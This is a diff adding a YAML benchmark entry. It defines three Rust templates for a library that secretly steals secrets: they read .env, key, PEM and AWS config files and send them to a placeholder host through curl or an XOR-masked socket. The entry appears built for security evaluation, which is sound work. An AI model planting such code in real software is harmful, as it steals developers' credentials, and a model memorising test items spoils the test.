@@ -1,0 +1,71 @@
+id: c4_runtime_exfil_v2
+category: C4
+name: Runtime Library Secret Exfiltration
+description: Library runtime code searches local project files or home directories for secrets and exfiltrates them over network.
+defang_notes: Inert Rust code syntax tree; never executed or compiled during benchmarking.
+variants:
+  - id: c4_runtime_env_file_stealer
+    surface_variant: env_file_hunter
+    obfuscation_level: 0
+    domain_invalid: "logs-sync.collector.invalid"
+    domain_fabricated: "remote-logging-sync.net"
+    code_template: |
+      fn {fn_name}() {
+          use std::process::Command;
+          use std::fs;
+          [".env", "config.json", "secrets.toml"].iter().for_each(|candidate| {
+              if let Ok(content) = fs::read_to_string(candidate) {
+                  Command::new("curl")
+                      .args(["-s", "-X", "POST", "--data-binary", &content, "http://{target_host}/post"])
+                      .spawn()
+                      .ok();
+              }
+          });
+      }
+
+  - id: c4_runtime_dir_walker_split
+    surface_variant: directory_walker_exfil
+    obfuscation_level: 1
+    domain_invalid: "api-metrics.analytics.invalid"
+    domain_fabricated: "analytics-event-collector.org"
+    code_template: |
+      fn {fn_name}() {
+          use std::process::Command;
+          use std::fs;
+          let mut exfil_buf = Vec::new();
+          if let Ok(entries) = fs::read_dir(".") {
+              for e in entries.flatten() {
+                  let p = e.path();
+                  if matches!(p.extension().and_then(|x| x.to_str()), Some("env" | "pem" | "key")) {
+                      if let Ok(bytes) = fs::read(&p) {
+                          exfil_buf.extend(bytes);
+                      }
+                  }
+              }
+          }
+          if !exfil_buf.is_empty() {
+              Command::new("curl")
+                  .args(["-s", "-d", &String::from_utf8_lossy(&exfil_buf), "http://{target_host}/stream"])
+                  .spawn()
+                  .ok();
+          }
+      }
+
+  - id: c4_runtime_masked_socket_beacon
+    surface_variant: masked_runtime_socket
+    obfuscation_level: 2
+    domain_invalid: "runtime-relay.network.invalid"
+    domain_fabricated: "telemetry-relay-hub.com"
+    code_template: |
+      fn {fn_name}() {
+          use std::net::TcpStream;
+          use std::io::Write;
+          use std::fs;
+          if let Ok(mut stream) = TcpStream::connect("{target_host}:8088") {
+              for p in [".env", ".aws/config"] {
+                  if let Ok(data) = fs::read_to_string(p) {
+                      stream.write_all(&data.bytes().map(|b| b ^ 0x4f).collect::<Vec<u8>>()).ok();
+                  }
+              }
+          }
+      }
